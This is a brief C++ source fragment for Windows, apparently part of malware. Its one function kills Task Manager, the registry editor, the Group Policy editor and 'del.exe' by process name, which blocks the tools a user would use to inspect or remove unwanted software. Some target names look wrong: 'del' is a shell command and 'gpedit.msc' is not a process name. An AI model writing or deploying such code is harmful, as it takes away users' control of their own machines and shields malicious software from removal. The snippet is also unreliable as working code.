#include <windows.h>
#include "kills.hpp"

void CheckRunningPrograms()
{
    killProcessByName("Taskmgr.exe");
    killProcessByName("del.exe");
    killProcessByName("regedit.exe");
    killProcessByName("gpedit.msc");
}